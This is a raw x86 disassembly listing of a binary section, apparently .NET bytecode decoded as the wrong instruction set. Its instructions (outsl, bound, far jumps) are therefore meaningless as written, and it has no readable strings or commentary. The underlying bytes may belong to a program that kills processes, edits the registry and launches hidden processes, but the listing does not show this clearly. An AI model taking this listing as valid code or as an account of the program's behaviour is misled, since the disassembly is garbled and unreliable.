  4040f0:	1b 02                	sbb    (%edx),%eax
  4040f2:	20 cd                	and    %cl,%ch
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 6f 62             	add    %ch,0x62(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 02                	or     (%edx),%al
  4040fd:	03 68 28             	add    0x28(%eax),%ebp
  404100:	29 00                	sub    %eax,(%eax)
  404102:	00 06                	add    %al,(%esi)
  404104:	16                   	push   %ss
  404105:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  404108:	00 00                	add    %al,(%eax)
  40410a:	0a 2a                	or     (%edx),%ch
  40410c:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  404112:	20 ce                	and    %cl,%dh
  404114:	00 00                	add    %al,(%eax)
  404116:	00 6f 62             	add    %ch,0x62(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 02                	or     (%edx),%al
  40411d:	03 69 28             	add    0x28(%ecx),%ebp
  404120:	28 00                	sub    %al,(%eax)
  404122:	00 06                	add    %al,(%esi)
  404124:	16                   	push   %ss
  404125:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 2a                	or     (%edx),%ch
  40412c:	02 20                	add    (%eax),%ah
  40412e:	d3 00                	roll   %cl,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	6f                   	outsl  %ds:(%esi),(%dx)
  404133:	62 00                	bound  %eax,(%eax)
  404135:	00 0a                	add    %cl,(%edx)
  404137:	02 03                	add    (%ebx),%al
  404139:	28 27                	sub    %ah,(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	16                   	push   %ss
  40413f:	1e                   	push   %ds
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	4c                   	dec    %esp
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 2a                	or     (%edx),%ch
  404146:	03 20                	add    (%eax),%esp
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  404150:	20 d3                	and    %dl,%bl
  404152:	00 00                	add    %al,(%eax)
  404154:	00 6f 62             	add    %ch,0x62(%edi)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 02                	or     (%edx),%al
  40415b:	03 28                	add    (%eax),%ebp
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	06                   	push   %es
  404161:	16                   	push   %ss
  404162:	1e                   	push   %ds
  404163:	6f                   	outsl  %ds:(%esi),(%dx)
  404164:	4c                   	dec    %esp
  404165:	00 00                	add    %al,(%eax)
  404167:	0a 2a                	or     (%edx),%ch
  404169:	03 20                	add    (%eax),%esp
  40416b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404171:	1b 02                	sbb    (%edx),%eax
  404173:	20 d2                	and    %dl,%dl
  404175:	00 00                	add    %al,(%eax)
  404177:	00 6f 62             	add    %ch,0x62(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 02                	or     (%edx),%al
  40417e:	03 69 28             	add    0x28(%ecx),%ebp
  404181:	28 00                	sub    %al,(%eax)
  404183:	00 06                	add    %al,(%esi)
  404185:	16                   	push   %ss
  404186:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404189:	00 00                	add    %al,(%eax)
  40418b:	0a 2a                	or     (%edx),%ch
  40418d:	03 1f                	add    (%edi),%ebx
  40418f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404193:	02 20                	add    (%eax),%ah
  404195:	d1 00                	roll   $1,(%eax)
  404197:	00 00                	add    %al,(%eax)
  404199:	6f                   	outsl  %ds:(%esi),(%dx)
  40419a:	62 00                	bound  %eax,(%eax)
  40419c:	00 0a                	add    %cl,(%edx)
  40419e:	02 03                	add    (%ebx),%al
  4041a0:	68 28 29 00 00       	push   $0x2928
  4041a5:	06                   	push   %es
  4041a6:	16                   	push   %ss
  4041a7:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 2a                	or     (%edx),%ch
  4041ae:	03 1f                	add    (%edi),%ebx
  4041b0:	e0 6a                	loopne 0x40421c
  4041b2:	30 14 02             	xor    %dl,(%edx,%eax,1)
  4041b5:	20 d0                	and    %dl,%al
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	00 6f 62             	add    %ch,0x62(%edi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	0a 02                	or     (%edx),%al
  4041c0:	03 d2                	add    %edx,%edx
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	62 00                	bound  %eax,(%eax)
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	2a 02                	sub    (%edx),%al
  4041c9:	03 d2                	add    %edx,%edx
  4041cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cc:	62 00                	bound  %eax,(%eax)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	2a 00                	sub    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	06                   	push   %es
  4041d7:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 7e 05             	adc    %edi,0x5(%esi)
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	04 28                	add    $0x28,%al
  4041e6:	85 00                	test   %eax,(%eax)
  4041e8:	00 0a                	add    %cl,(%edx)
  4041ea:	7e 06                	jle    0x4041f2
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 28                	add    $0x28,%al
  4041f0:	86 00                	xchg   %al,(%eax)
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	73 87                	jae    0x40417d
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 0a                	or     (%edx),%cl
  4041fa:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  404200:	89 00                	mov    %eax,(%eax)
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	8a 00                	mov    (%eax),%al
  404207:	00 0a                	add    %cl,(%edx)
  404209:	06                   	push   %es
  40420a:	6f                   	outsl  %ds:(%esi),(%dx)
  40420b:	8b 00                	mov    (%eax),%eax
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  404216:	02 00                	add    (%eax),%al
  404218:	00 16                	add    %dl,(%esi)
  40421a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40421d:	10 20                	adc    %ah,(%eax)
  40421f:	e8 03 00 00 28       	call   0x28404227
  404224:	14 00                	adc    $0x0,%al
  404226:	00 0a                	add    %cl,(%edx)
  404228:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40422b:	58                   	pop    %eax
  40422c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40422f:	04 1f                	add    $0x1f,%al
  404231:	0a 32                	or     (%edx),%dh
  404233:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  40423a:	05 16 13 06 2b       	add    $0x2b061316,%eax
  40423f:	32 11                	xor    (%ecx),%dl
  404241:	05 11 06 9a 13       	add    $0x139a0611,%eax
  404246:	07                   	pop    %es
  404247:	11 07                	adc    %eax,(%edi)
  404249:	6f                   	outsl  %ds:(%esi),(%dx)
  40424a:	89 00                	mov    %eax,(%eax)
  40424c:	00 0a                	add    %cl,(%edx)
  40424e:	6f                   	outsl  %ds:(%esi),(%dx)
  40424f:	8a 00                	mov    (%eax),%al
  404251:	00 0a                	add    %cl,(%edx)
  404253:	06                   	push   %es
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	8b 00                	mov    (%eax),%eax
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 27                	sub    %ah,(%edi)
  40425b:	00 00                	add    %al,(%eax)
  40425d:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404260:	11 07                	adc    %eax,(%edi)
  404262:	6f                   	outsl  %ds:(%esi),(%dx)
  404263:	8e 00                	mov    (%eax),%es
  404265:	00 0a                	add    %cl,(%edx)
  404267:	de 03                	fiadds (%ebx)
  404269:	26 de 00             	fiadds %es:(%eax)
  40426c:	11 06                	adc    %eax,(%esi)
  40426e:	17                   	pop    %ss
  40426f:	58                   	pop    %eax
  404270:	13 06                	adc    (%esi),%eax
  404272:	11 06                	adc    %eax,(%esi)
  404274:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  40427a:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404280:	7e 73                	jle    0x4042f5
  404282:	8f 00                	pop    (%eax)
  404284:	00 0a                	add    %cl,(%edx)
  404286:	13 08                	adc    (%eax),%ecx
  404288:	11 08                	adc    %ecx,(%eax)
  40428a:	73 90                	jae    0x40421c
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 13                	or     (%ebx),%dl
  404290:	09 11                	or     %edx,(%ecx)
  404292:	09 72 cd             	or     %esi,-0x33(%edx)
  404295:	21 00                	and    %eax,(%eax)
  404297:	70 6f                	jo     0x404308
  404299:	91                   	xchg   %eax,%ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 11                	or     (%ecx),%dl
  40429e:	09 1b                	or     %ebx,(%ebx)
  4042a0:	8d 39                	lea    (%ecx),%edi
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	01 25 16 72 e7 21    	add    %esp,0x21e77216
  4042aa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4042ad:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	0a 28                	or     (%eax),%ch
  4042b6:	92                   	xchg   %eax,%edx
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	0a a2 25 18 72 3b    	or     0x3b721825(%edx),%ah
  4042bf:	22 00                	and    (%eax),%al
  4042c1:	70 a2                	jo     0x404265
  4042c3:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	0a a2 25 1a 72 4f    	or     0x4f721a25(%edx),%ah
  4042d0:	22 00                	and    (%eax),%al
  4042d2:	70 a2                	jo     0x404276
  4042d4:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  4042da:	94                   	xchg   %eax,%esp
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	0a 11                	or     (%ecx),%dl
  4042df:	09 17                	or     %edx,(%edi)
  4042e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042e2:	95                   	xchg   %eax,%ebp
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 11                	or     (%ecx),%dl
  4042e7:	09 17                	or     %edx,(%edi)
  4042e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ea:	96                   	xchg   %eax,%esi
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 11                	or     (%ecx),%dl
  4042ef:	09 6f 97             	or     %ebp,-0x69(%edi)
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 11                	or     (%ecx),%dl
  4042f6:	08 6f 98             	or     %ch,-0x68(%edi)
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	0a 26                	or     (%esi),%ah
  4042fd:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  404301:	00 00                	add    %al,(%eax)
  404303:	0a 72 55             	or     0x55(%edx),%dh
  404306:	22 00                	and    (%eax),%al
  404308:	70 28                	jo     0x404332
  40430a:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 13                	or     (%ebx),%dl
  404315:	0a 11                	or     (%ecx),%dl
  404317:	0a 06                	or     (%esi),%al
  404319:	6f                   	outsl  %ds:(%esi),(%dx)
  40431a:	8b 00                	mov    (%eax),%eax
  40431c:	00 0a                	add    %cl,(%edx)
  40431e:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  404324:	b3 22                	mov    $0x22,%bl
  404326:	00 70 06             	add    %dh,0x6(%eax)
  404329:	6f                   	outsl  %ds:(%esi),(%dx)
  40432a:	8b 00                	mov    (%eax),%eax
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	72 b3                	jb     0x4042e3
  404330:	22 00                	and    (%eax),%al
  404332:	70 28                	jo     0x40435c
  404334:	9c                   	pushf
  404335:	00 00                	add    %al,(%eax)
  404337:	0a 6f 9d             	or     -0x63(%edi),%ch
  40433a:	00 00                	add    %al,(%eax)
  40433c:	0a de                	or     %dh,%bl
  40433e:	0c 11                	or     $0x11,%al
  404340:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404343:	11 0a                	adc    %ecx,(%edx)
  404345:	6f                   	outsl  %ds:(%esi),(%dx)
  404346:	33 00                	xor    (%eax),%eax
  404348:	00 0a                	add    %cl,(%edx)
  40434a:	dc 06                	faddl  (%esi)
  40434c:	6f                   	outsl  %ds:(%esi),(%dx)
  40434d:	8b 00                	mov    (%eax),%eax
  40434f:	00 0a                	add    %cl,(%edx)
  404351:	28 73 00             	sub    %dh,0x0(%ebx)
  404354:	00 0a                	add    %cl,(%edx)
  404356:	2c 15                	sub    $0x15,%al
  404358:	06                   	push   %es
  404359:	6f                   	outsl  %ds:(%esi),(%dx)
  40435a:	8b 00                	mov    (%eax),%eax
  40435c:	00 0a                	add    %cl,(%edx)
  40435e:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  404364:	e8 03 00 00 28       	call   0x2840436c
  404369:	14 00                	adc    $0x0,%al
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	06                   	push   %es
  40436e:	6f                   	outsl  %ds:(%esi),(%dx)
  40436f:	8b 00                	mov    (%eax),%eax
  404371:	00 0a                	add    %cl,(%edx)
  404373:	17                   	pop    %ss
  404374:	73 77                	jae    0x4043ed
  404376:	00 00                	add    %al,(%eax)
  404378:	0a 28                	or     (%eax),%ch
  40437a:	88 00                	mov    %al,(%eax)
  40437c:	00 0a                	add    %cl,(%edx)
  40437e:	6f                   	outsl  %ds:(%esi),(%dx)
  40437f:	89 00                	mov    %eax,(%eax)
  404381:	00 0a                	add    %cl,(%edx)
  404383:	6f                   	outsl  %ds:(%esi),(%dx)
  404384:	8a 00                	mov    (%eax),%al
  404386:	00 0a                	add    %cl,(%edx)
  404388:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  40438e:	25 07 16 07 8e       	and    $0x8e071607,%eax
  404393:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  40439a:	18 00                	sbb    %al,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	20 00                	and    %al,(%eax)
  4043a0:	00 71 02             	add    %dh,0x2(%ecx)
  4043a3:	20 00                	and    %al,(%eax)
  4043a5:	40                   	inc    %eax
  4043a6:	0d 03 6f 19 00       	or     $0x196f03,%eax
  4043ab:	00 0a                	add    %cl,(%edx)
  4043ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4043b1:	01 0c 73             	add    %ecx,(%ebx,%esi,2)
  4043b4:	18 00                	sbb    %al,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	08 6f a0             	or     %ch,-0x60(%edi)
  4043bb:	00 00                	add    %al,(%eax)
  4043bd:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  4043c3:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  4043ca:	41                   	inc    %ecx
  4043cb:	00 00                	add    %al,(%eax)
  4043cd:	0a 28                	or     (%eax),%ch
  4043cf:	82 00 00             	addb   $0x0,(%eax)
  4043d2:	06                   	push   %es
  4043d3:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  4043d9:	b7 22                	mov    $0x22,%bh
  4043db:	00 70 28             	add    %dh,0x28(%eax)
  4043de:	51                   	push   %ecx
  4043df:	00 00                	add    %al,(%eax)
  4043e1:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  4043e7:	00 0a                	add    %cl,(%edx)
  4043e9:	13 0b                	adc    (%ebx),%ecx
  4043eb:	11 0b                	adc    %ecx,(%ebx)
  4043ed:	72 c1                	jb     0x4043b0
  4043ef:	22 00                	and    (%eax),%al
  4043f1:	70 6f                	jo     0x404462
  4043f3:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4043f8:	0b 72 d5             	or     -0x2b(%edx),%esi
  4043fb:	22 00                	and    (%eax),%al
  4043fd:	70 6f                	jo     0x40446e
  4043ff:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  404404:	0b 72 f5             	or     -0xb(%edx),%esi
  404407:	22 00                	and    (%eax),%al
  404409:	70 06                	jo     0x404411
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	8b 00                	mov    (%eax),%eax
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	72 b3                	jb     0x4043c5
  404412:	22 00                	and    (%eax),%al
  404414:	70 28                	jo     0x40443e
  404416:	9c                   	pushf
  404417:	00 00                	add    %al,(%eax)
  404419:	0a 6f a3             	or     -0x5d(%edi),%ch
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 11                	or     (%ecx),%dl
  404420:	0b 72 0b             	or     0xb(%edx),%esi
  404423:	23 00                	and    (%eax),%eax
  404425:	70 28                	jo     0x40444f
  404427:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404428:	00 00                	add    %al,(%eax)
  40442a:	0a 28                	or     (%eax),%ch
  40442c:	51                   	push   %ecx
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 6f a3             	or     -0x5d(%edi),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 11                	or     (%ecx),%dl
  404436:	0b 72 13             	or     0x13(%edx),%esi
  404439:	23 00                	and    (%eax),%eax
  40443b:	70 09                	jo     0x404446
  40443d:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  404443:	1f                   	pop    %ds
  404444:	23 00                	and    (%eax),%eax
  404446:	70 28                	jo     0x404470
  404448:	9c                   	pushf
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40444e:	00 00                	add    %al,(%eax)
  404450:	0a de                	or     %dh,%bl
  404452:	0c 11                	or     $0x11,%al
  404454:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  404457:	11 0b                	adc    %ecx,(%ebx)
  404459:	6f                   	outsl  %ds:(%esi),(%dx)
  40445a:	33 00                	xor    (%eax),%eax
  40445c:	00 0a                	add    %cl,(%edx)
  40445e:	dc 73 90             	fdivl  -0x70(%ebx)
  404461:	00 00                	add    %al,(%eax)
  404463:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	25 17 6f 96 00       	and    $0x966f17,%eax
  404470:	00 0a                	add    %cl,(%edx)
  404472:	25 16 6f a6 00       	and    $0xa66f16,%eax
  404477:	00 0a                	add    %cl,(%edx)
  404479:	25 16 6f a7 00       	and    $0xa76f16,%eax
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	25 17 6f 95 00       	and    $0x956f17,%eax
  404485:	00 0a                	add    %cl,(%edx)
  404487:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  40448d:	16                   	push   %ss
  40448e:	28 16                	sub    %dl,(%esi)
  404490:	00 00                	add    %al,(%eax)
  404492:	0a de                	or     %dh,%bl
  404494:	03 26                	add    (%esi),%esp
  404496:	de 00                	fiadds (%eax)
  404498:	2a 00                	sub    (%eax),%al
  40449a:	00 00                	add    %al,(%eax)
  40449c:	41                   	inc    %ecx
  40449d:	64 00 00             	add    %al,%fs:(%eax)
  4044a0:	00 00                	add    %al,(%eax)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	67 00 00             	add    %al,(%bx,%si)
  4044a7:	00 22                	add    %ah,(%edx)
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	00 01                	add    %al,(%ecx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 02                	add    %eax,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	00 36                	add    %dh,(%esi)
  4044bd:	01 00                	add    %eax,(%eax)
  4044bf:	00 29                	add    %ch,(%ecx)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 5f 01             	add    %bl,0x1(%edi)
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	0c 00                	or     $0x0,%al
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0b 02                	or     (%edx),%eax
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	68 00 00 00 73       	push   $0x73000000
  4044dd:	02 00                	add    (%eax),%al
  4044df:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	b5 02                	mov    $0x2,%ch
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	b5 02                	mov    $0x2,%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	03 00                	add    (%eax),%eax
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	02 00                	add    (%eax),%al
  404504:	2e 00 00             	add    %al,%cs:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 21                	adc    %esp,(%ecx)
  40450d:	00 22                	add    %ah,(%edx)
  40450f:	e2 33                	loop   0x404544
  404511:	0e                   	push   %cs
  404512:	00 00                	add    %al,(%eax)
  404514:	00 0a                	add    %cl,(%edx)
  404516:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  40451c:	ab                   	stos   %eax,%es:(%edi)
  40451d:	00 00                	add    %al,(%eax)
  40451f:	0a 73 ac             	or     -0x54(%ebx),%dh
  404522:	00 00                	add    %al,(%eax)
  404524:	0a 28                	or     (%eax),%ch
  404526:	ad                   	lods   %ds:(%esi),%eax
  404527:	00 00                	add    %al,(%eax)
  404529:	0a 06                	or     (%esi),%al
  40452b:	30 04 17             	xor    %al,(%edi,%edx,1)
  40452e:	0b de                	or     %esi,%ebx
  404530:	07                   	pop    %es
  404531:	de 03                	fiadds (%ebx)
  404533:	26 de 00             	fiadds %es:(%eax)
  404536:	16                   	push   %ss
  404537:	2a 07                	sub    (%edi),%al
  404539:	2a 00                	sub    (%eax),%al
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 27                	add    %ah,(%edi)
  404545:	27                   	daa
  404546:	00 03                	add    %al,(%ebx)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	02 00                	add    (%eax),%al
  404550:	28 00                	sub    %al,(%eax)
  404552:	00 00                	add    %al,(%eax)
  404554:	02 00                	add    (%eax),%al
  404556:	00 11                	add    %dl,(%ecx)
  404558:	73 ae                	jae    0x404508
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	af                   	scas   %es:(%edi),%eax
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 6f 5b             	or     0x5b(%edi),%ch
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 72 2f             	or     0x2f(%edx),%dh
  404569:	23 00                	and    (%eax),%eax
  40456b:	70 6f                	jo     0x4045dc
  40456d:	b0 00                	mov    $0x0,%al
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	2c 04                	sub    $0x4,%al
  404573:	17                   	pop    %ss
  404574:	0a de                	or     %dh,%bl
  404576:	07                   	pop    %es
  404577:	de 03                	fiadds (%ebx)
  404579:	26 de 00             	fiadds %es:(%eax)
  40457c:	16                   	push   %ss
  40457d:	2a 06                	sub    (%esi),%al
  40457f:	2a 01                	sub    (%ecx),%al
  404581:	10 00                	adc    %al,(%eax)
  404583:	00 00                	add    %al,(%eax)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 21                	add    %ah,(%ecx)
  404589:	21 00                	and    %eax,(%eax)
  40458b:	03 01                	add    (%ecx),%eax
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 1b                	add    %ebx,(%ebx)
  404591:	30 02                	xor    %al,(%edx)
  404593:	00 d0                	add    %dl,%al
  404595:	00 00                	add    %al,(%eax)
  404597:	00 19                	add    %bl,(%ecx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	11 72 35             	adc    %esi,0x35(%edx)
  40459e:	23 00                	and    (%eax),%eax
  4045a0:	70 73                	jo     0x404615
  4045a2:	b1 00                	mov    $0x0,%cl
  4045a4:	00 0a                	add    %cl,(%edx)
  4045a6:	0a 06                	or     (%esi),%al
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	b2 00                	mov    $0x0,%dl
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	0b 07                	or     (%edi),%eax
  4045af:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b0:	b3 00                	mov    $0x0,%bl
  4045b2:	00 0a                	add    %cl,(%edx)
  4045b4:	0c 2b                	or     $0x2b,%al
  4045b6:	7c 08                	jl     0x4045c0
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	b4 00                	mov    $0x0,%ah
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	0d 09 72 7b 23       	or     $0x237b7209,%eax
  4045c2:	00 70 6f             	add    %dh,0x6f(%eax)
  4045c5:	b5 00                	mov    $0x0,%ch
  4045c7:	00 0a                	add    %cl,(%edx)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cf:	5b                   	pop    %ebx
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 13                	or     (%ebx),%dl
  4045d4:	04 11                	add    $0x11,%al
  4045d6:	04 72                	add    $0x72,%al
  4045d8:	95                   	xchg   %eax,%ebp
  4045d9:	23 00                	and    (%eax),%eax
  4045db:	70 28                	jo     0x404605
  4045dd:	27                   	daa
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4045e3:	09 72 c1             	or     %esi,-0x3f(%edx)
  4045e6:	23 00                	and    (%eax),%eax
  4045e8:	70 6f                	jo     0x404659
  4045ea:	b5 00                	mov    $0x0,%ch
  4045ec:	00 0a                	add    %cl,(%edx)
  4045ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ef:	38 00                	cmp    %al,(%eax)
  4045f1:	00 0a                	add    %cl,(%edx)
  4045f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f4:	b6 00                	mov    $0x0,%dh
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	72 cd                	jb     0x4045c7
  4045fa:	23 00                	and    (%eax),%eax
  4045fc:	70 6f                	jo     0x40466d
  4045fe:	b0 00                	mov    $0x0,%al
  404600:	00 0a                	add    %cl,(%edx)
  404602:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  404607:	dd 23                	frstor (%ebx)
  404609:	00 70 6f             	add    %dh,0x6f(%eax)
  40460c:	b0 00                	mov    $0x0,%al
  40460e:	00 0a                	add    %cl,(%edx)
  404610:	2d 1c 09 72 c1       	sub    $0xc172091c,%eax
  404615:	23 00                	and    (%eax),%eax
  404617:	70 6f                	jo     0x404688
  404619:	b5 00                	mov    $0x0,%ch
  40461b:	00 0a                	add    %cl,(%edx)
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	38 00                	cmp    %al,(%eax)
  404620:	00 0a                	add    %cl,(%edx)
  404622:	72 eb                	jb     0x40460f
  404624:	23 00                	and    (%eax),%eax
  404626:	70 28                	jo     0x404650
  404628:	27                   	daa
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  404632:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 3a                	or     (%edx),%bh
  40463a:	79 ff                	jns    0x40463b
  40463c:	ff                   	(bad)
  40463d:	ff                   	lcall  (bad)
  40463e:	de 0a                	fimuls (%edx)
  404640:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404643:	08 6f 33             	or     %ch,0x33(%edi)
  404646:	00 00                	add    %al,(%eax)
  404648:	0a dc                	or     %ah,%bl
  40464a:	de 0a                	fimuls (%edx)
  40464c:	07                   	pop    %es
  40464d:	2c 06                	sub    $0x6,%al
  40464f:	07                   	pop    %es
  404650:	6f                   	outsl  %ds:(%esi),(%dx)
  404651:	33 00                	xor    (%eax),%eax
  404653:	00 0a                	add    %cl,(%edx)
  404655:	dc de                	(bad)
  404657:	0a 06                	or     (%esi),%al
  404659:	2c 06                	sub    $0x6,%al
  40465b:	06                   	push   %es
  40465c:	6f                   	outsl  %ds:(%esi),(%dx)
  40465d:	33 00                	xor    (%eax),%eax
